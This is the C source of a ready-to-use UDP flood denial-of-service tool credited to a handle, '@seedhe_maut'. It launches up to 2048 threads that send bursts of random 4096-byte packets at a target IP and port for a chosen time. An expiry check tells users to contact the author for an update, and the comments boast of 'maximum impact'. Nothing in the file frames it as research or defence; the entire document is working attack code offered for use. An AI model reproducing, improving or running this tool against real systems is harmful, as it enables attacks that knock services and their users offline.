#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <fcntl.h>

#define PACKET_SIZE 4096   // Adjustable UDP payload size
#define MAX_THREADS 2048   // Higher thread limit for more power
#define EXPIRY_DATE 1742448000  // UNIX timestamp for March 20, 2025

// MADE AND OWNER BY @seedhe_maut

typedef struct {
    char target_ip[16];
    int target_port;
    int duration;
} AttackParams;

// Expiry function: Prevents execution after March 20, 2025
void check_expiry() {
    time_t current_time = time(NULL);
    if (current_time > EXPIRY_DATE) {
        printf("❌ This script has expired. Contact @seedhe_maut for an update.\n");
        exit(1);
    }
}

// Function to generate a strong random payload
void generate_payload(char *buffer, size_t size) {
    for (size_t i = 0; i < size; i++) {
        buffer[i] = (char)(rand() % 256);
    }
}

// Attack function executed by each thread
void *udp_flood(void *arg) {
    AttackParams *params = (AttackParams *)arg;
    struct sockaddr_in target;
    int sock;
    char buffer[PACKET_SIZE];

    target.sin_family = AF_INET;
    target.sin_port = htons(params->target_port);
    inet_pton(AF_INET, params->target_ip, &target.sin_addr);

    // Create socket with non-blocking mode for continuous sending
    sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        perror("Socket creation failed");
        return NULL;
    }
    fcntl(sock, F_SETFL, O_NONBLOCK);  // Set non-blocking mode

    time_t start_time = time(NULL);
    generate_payload(buffer, sizeof(buffer));

    while (time(NULL) - start_time < params->duration) {
        for (int i = 0; i < 1000; i++) {  // Burst fire for maximum impact
            sendto(sock, buffer, sizeof(buffer), 0, (struct sockaddr *)&target, sizeof(target));
        }
    }

    close(sock);
    return NULL;
}

int main(int argc, char *argv[]) {
    check_expiry();  // Ensure script hasn't expired

    if (argc != 5) {
        printf("Usage: %s <IP> <Port> <Time> <Threads>\n", argv[0]);
        return 1;
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int thread_count = atoi(argv[4]);

    if (thread_count > MAX_THREADS) {
        thread_count = MAX_THREADS;  // Prevent excessive threads
    }

    pthread_t threads[MAX_THREADS];
    AttackParams params = {.target_port = port, .duration = duration};
    strncpy(params.target_ip, ip, sizeof(params.target_ip) - 1);

    for (int i = 0; i < thread_count; i++) {
        pthread_create(&threads[i], NULL, udp_flood, &params);
    }

    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }

    return 0;
}
